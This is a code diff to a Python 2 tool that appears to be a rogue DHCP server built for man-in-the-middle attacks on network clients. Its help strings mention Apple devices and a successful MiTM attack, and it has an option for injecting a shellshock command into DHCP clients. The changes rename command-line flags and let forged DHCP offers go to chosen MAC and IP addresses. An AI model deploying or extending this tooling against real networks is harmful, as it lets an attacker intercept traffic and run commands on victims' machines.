@@ -28,8 +28,8 @@ parser.add_argument('-t', '--target_mac', type=str, help='Set target MAC address
 parser.add_argument('-I', '--target_ip', type=str, help='Set client IP address with MAC in --target_mac', default=None)
 parser.add_argument('-q', '--quiet', action='store_true', help='Minimal output')
 parser.add_argument('--apple', action='store_true', help='Apple devices MiTM')
-parser.add_argument('--cisco', action='store_true', help='Cisco devices MiTM')
-parser.add_argument('--new', action='store_true', help='New client or client after DHCP DECLINE')
+parser.add_argument('--broadcast_response', action='store_true', help='Send broadcast response')
+parser.add_argument('--force', action='store_true', help='For new client or client after DHCP DECLINE')
 parser.add_argument('--not_exit', action='store_true', help='Not exit on success MiTM attack')
 
 parser.add_argument('-c', '--shellshock_command', type=str, help='Set shellshock command in DHCP client')
@@ -180,11 +180,15 @@ if not args.quiet:
     print Base.c_info + "TFTP server IP address: " + Base.cINFO + tftp_server_ip_address + Base.cEND
 
 
-def make_dhcp_offer_packet(transaction_id):
+def make_dhcp_offer_packet(transaction_id, destination_mac=None, destination_ip=None):
+    if destination_mac is None:
+        destination_mac = target_mac_address
+    if destination_ip is None:
+        destination_ip = "255.255.255.255"
     return dhcp.make_response_packet(source_mac=dhcp_server_mac_address,
-                                     destination_mac=target_mac_address,
+                                     destination_mac=destination_mac,
                                      source_ip=dhcp_server_ip_address,
-                                     destination_ip="255.255.255.255",
+                                     destination_ip=destination_ip,
                                      transaction_id=transaction_id,
                                      your_ip=offer_ip_address,
                                      client_mac=target_mac_address,
@@ -283,7 +287,7 @@ def dhcp_reply(request):
         if request[DHCP].options[0][1] == 1:
             is_new_connection = True
             print Base.c_info + "DHCP DISCOVER from: " + target_mac_address + " transaction id: " + hex(transaction_id)
-            if args.new:
+            if args.force:
                 if target_ip_address is not None:
                     requested_ip = target_ip_address
                 else:
@@ -366,7 +370,7 @@ def dhcp_reply(request):
             print Base.c_info + "DHCP REQUEST from: " + target_mac_address + " transaction id: " + \
                 hex(transaction_id) + " requested ip: " + requested_ip
 
-            if args.cisco:
+            if args.broadcast_response:
                 ack_packet = make_dhcp_ack_packet(transaction_id, requested_ip, "ff:ff:ff:ff:ff:ff", "255.255.255.255")
                 SOCK.send(ack_packet)
                 print Base.c_info + "Send ack response to Cisco device: " + target_mac_address
@@ -468,7 +472,7 @@ def dhcp_reply(request):
                     arp_req_router = True
 
                 if arp_req_router or arp_req_your_ip:
-                    if not possible_output and not args.apple and not args.cisco and not args.new:
+                    if not possible_output and not args.apple:
                         try:
                             print Base.c_warning + "Possible MiTM! Target: " + Base.cWARNING + \
                                   target_ip_address + " (" + target_mac_address + ")" + Base.cEND
